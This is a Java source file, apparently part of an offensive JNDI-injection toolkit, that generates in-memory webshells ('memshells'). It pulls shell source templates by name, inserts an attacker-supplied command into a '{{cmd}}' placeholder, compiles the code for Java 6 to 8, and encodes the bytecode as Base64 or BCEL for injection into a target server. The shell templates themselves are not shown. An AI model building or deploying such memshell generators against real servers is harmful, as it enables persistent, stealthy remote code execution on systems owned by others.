package core;

import core.memshellstr.ConstantTemplate;
import core.utils.Compiler;
import jndi.JettyServer;
import utils.Util;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class GenerateMemShell {
    public static Map<String, Map<String, byte[]>> shellCodeMapper = new HashMap<String, Map<String, byte[]>>();
    public static Map<String, List<String>> optionsMapper = new HashMap<String, List<String>>();

    static {
        List<String> options = new ArrayList<String>();
        options.add("-source");
        options.add("1.8");
        options.add("-target");
        options.add("1.8");
        optionsMapper.put("8", options);

        List<String> options2 = new ArrayList<String>();
        options2.add("-source");
        options2.add("1.7");
        options2.add("-target");
        options2.add("1.7");
        optionsMapper.put("7", options2);

        List<String> options3 = new ArrayList<String>();
        options3.add("-source");
        options3.add("1.6");
        options3.add("-target");
        options3.add("1.6");
        optionsMapper.put("6", options3);
    }


    public static void main(String[] args) {

    }

    public static String generateMemShell(String memName, String encodeType, String version) {
        Field constantName = null;
        String memShellString = "";
        String encodeString = "";
        Map<String, byte[]> shellcode = null;
        byte[] codeByte = new byte[0];
        shellcode = shellCodeMapper.get(memName);
        if (shellcode != null && !shellcode.isEmpty()) {
            codeByte = shellcode.get(version);
        }
        if(codeByte == null || codeByte.length == 0){
            try {
                Map<String, byte[]> tmp = new HashMap<String, byte[]>();
                constantName = ConstantTemplate.class.getDeclaredField(memName);
                memShellString = (String) constantName.get(new ConstantTemplate());
                String jndiCmd = JettyServer.command;
                if (jndiCmd !=null && !jndiCmd.equals("")){
                    memShellString = memShellString.replace("{{cmd}}", jndiCmd); // jndi 动态执行命令
                }
                shellcode = Compiler.createMemShell(memName, memShellString, optionsMapper.get(version));
                codeByte = shellcode.get(memName);
                tmp.put(version, codeByte);
                shellCodeMapper.put(memName, tmp);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        try {
            if ("BASE64".equals(encodeType)) {
                encodeString = Util.base64Encode(codeByte);

            } else if ("BCEL".equals(encodeType)) {
                encodeString = Util.generateBcelCode2(codeByte);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return encodeString;
    }
}
